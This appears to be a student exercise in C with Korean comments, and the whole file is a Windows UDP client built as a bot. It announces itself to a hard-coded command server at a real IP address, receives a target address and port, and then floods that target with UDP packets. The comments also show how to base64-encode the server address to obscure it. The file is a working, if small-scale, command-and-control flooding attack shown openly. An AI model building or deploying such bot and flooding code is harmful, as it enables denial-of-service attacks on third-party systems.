#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#pragma comment(lib, "ws2_32.lib")
#include <string.h>
#include <stdlib.h>
#include <math.h>

/*
		서버주소 base64 인코딩
//------ Base64 Encoding Table ------//

static const char MimeBase64[] = {
   'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
   'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
   'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
   'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
   'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
   'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
   'w', 'x', 'y', 'z', '0', '1', '2', '3',
   '4', '5', '6', '7', '8', '9', '+', '/'
};

int base64_encode(char* text, int numBytes, char** encodedText)
{
	unsigned char input[3] = { 0,0,0 };
	unsigned char output[4] = { 0,0,0,0 };
	int   index, i, j, size;
	char* p, * plen;

	plen = text + numBytes - 1;
	size = (4 * (numBytes / 3)) + (numBytes % 3 ? 4 : 0) + 1;
	(*encodedText) = malloc(size);
	j = 0;

	for (i = 0, p = text; p <= plen; i++, p++) {
		index = i % 3;
		input[index] = *p;

		if (index == 2 || p == plen) {
			output[0] = ((input[0] & 0xFC) >> 2);
			output[1] = ((input[0] & 0x3) << 4) | ((input[1] & 0xF0) >> 4);
			output[2] = ((input[1] & 0xF) << 2) | ((input[2] & 0xC0) >> 6);
			output[3] = (input[2] & 0x3F);

			(*encodedText)[j++] = MimeBase64[output[0]];
			(*encodedText)[j++] = MimeBase64[output[1]];
			(*encodedText)[j++] = index == 0 ? '=' : MimeBase64[output[2]];
			(*encodedText)[j++] = index < 2 ? '=' : MimeBase64[output[3]];

			input[0] = input[1] = input[2] = 0;
		}
	}

	(*encodedText)[j] = '\0';
	return 0;
}
*/



#define PORT 10004			// 서버의 포트번호
#define BUFSIZE 1024		// 버퍼사이즈


int main(int argc, char* argv[]) {
	/*
	char* cpStr = "114.70.37.17";		-> 114.70.37.17을 base64로 인코딩(위의 전체주석 열어보면 함수 있음)
	char* encoded[10];

	base64_encode(cpStr, strlen(cpStr), encoded);
	printf("%s\n", *encoded);			-> base64 인코딩 되어 'MTE0LjcwLjM3LjE3'로 출력됨.
	*/



	WSADATA winsockData;	// 윈속을 사용하기 위해 사용하는 윈속 초기화 구조체
	SOCKET serverSocket;	// 소켓 구조체
	SOCKADDR_IN serverAddr;	// 소켓 주소 구조체. 주소 정보를 담고 있다.
	//SOCKADDR_IN clientAddr;


	int serverSize;
	int recvLen;
	int sendLen;
	char buf_rcv[BUFSIZE];
	char buf_snd[BUFSIZE] = "IMHACKER_2018111332";	// 전송 메시지
	char buf_snd2[BUFSIZE] = "2018111332";
	int i = 0;

	// WSAStartup() : 윈속 초기화 함수
	if (WSAStartup(0X202, &winsockData) == SOCKET_ERROR) {
		printf("Winsock Initialization failed.\n");
		WSACleanup();
		return;
	}


	// socket() : 소켓을 열고, 열린 소켓에 해당하는 파일 디스크립터 리턴. 디스크립터에 의해 데이터 주고받음.
	serverSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);	// 인자: IPv4영역에서 통신, UDP프로토콜 사용, 프로토콜 값 결정
	if (serverSocket == INVALID_SOCKET) {
		printf("Socket creation failed.\n");
		WSACleanup();
		return;
	}
	printf("Socket create.\n");


	memset(&serverAddr, 0, sizeof(serverAddr));
	// socket 사용을 위한 소켓 주소 구조체 초기화
	serverAddr.sin_family = AF_INET;							// IPv4
	serverAddr.sin_addr.s_addr = inet_addr("114.70.37.17");		// 실제 통신에 사용할 IP주소 결정
	serverAddr.sin_port = htons(PORT);							// 실제 통신에 사용할 포트번호 결정


	// sendto() : 소켓에 데이터를 쓰는 함수. serversocket 소켓을 통해 serverAddr을 주소로 갖는 서버에게 데이터 보냄.
	recvLen = strlen(buf_snd);
	sendLen = sendto(serverSocket, buf_snd, recvLen, 0,
		(struct sockaddr*) & serverAddr, sizeof(serverAddr));
	if (sendLen != recvLen) {
		printf("sendto() error.\n");
		return;
	}


	// recvfrom() : 소켓으로부터 데이터를 읽어들이는 함수. buf_rcv에 저장.
	serverSize = sizeof(serverAddr);
	recvLen = recvfrom(serverSocket, buf_rcv, BUFSIZE, 0,
		(struct sockaddr*) & serverAddr, &serverSize);
	if (recvLen < 0) {
		printf("recvfrom() error.\n");
		return;
	}
	printf("Receive: %s\n", buf_rcv);	// 받은 데이터 출력

	closesocket(serverSocket);		// 소켓 닫기




	// strtok()를 사용하여 서버에서 받아온 문자열 자르기
	char* token = NULL;
	char s1[] = "_,:";				// _와 :을 기준으로 자름
	char* ip = NULL;
	char* port = NULL;

	token = strtok(buf_rcv, s1);
	ip = strtok(NULL, s1);			// udp flodding에 사용할 공격지 ip주소
	//printf("ip = %s\n", ip);
	port = strtok(NULL, s1);		// udp flooding에 사용할 공격지 포트번호
	//printf("port = %s\n", port);
	int portnumber = atoi(port);	// htons타입 맞추기 위해 문자열을 정수로 변환



	// udp flooding을 위한 소켓 통신 //

	// WSAStartup() : 윈속 초기화 함수
	if (WSAStartup(0X202, &winsockData) == SOCKET_ERROR) {
		printf("Winsock Initialization failed.\n");
		WSACleanup();
		return;
	}


	// socket() : 소켓을 열고, 열린 소켓에 해당하는 파일 디스크립터 리턴. 디스크립터에 의해 데이터 주고받음.
	serverSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);	// 인자: IPv4영역에서 통신, UDP프로토콜 사용, 프로토콜 값 결정
	if (serverSocket == INVALID_SOCKET) {
		printf("Socket creation failed.\n");
		WSACleanup();
		return;
	}
	printf("Socket create.\n");


	memset(&serverAddr, 0, sizeof(serverAddr));
	// socket 사용을 위한 소켓 주소 구조체 초기화
	serverAddr.sin_family = AF_INET;				// IPv4
	serverAddr.sin_addr.s_addr = inet_addr(ip);		// 서버에서 받아온 공격지 IP주소 
	serverAddr.sin_port = htons(portnumber);		// 서버에서 받아온 공격지 포트번호

	// udp flooding(10회 반복하여 전송)
	for (i = 0; i < 10; i++) {
		// sendto() : 소켓에 데이터를 쓰는 함수. serversocket 소켓을 통해 serverAddr을 주소로 갖는 서버에게 데이터 보냄.
		recvLen = strlen(buf_snd2);
		sendLen = sendto(serverSocket, buf_snd2, recvLen, 0,
			(struct sockaddr*) & serverAddr, sizeof(serverAddr));
		if (sendLen != recvLen) {
			printf("sendto() error.\n");
			return;
		}
	}
	printf("udp flooding...complete!\n");
	closesocket(serverSocket);		// 소켓 닫기

	return 0;
}
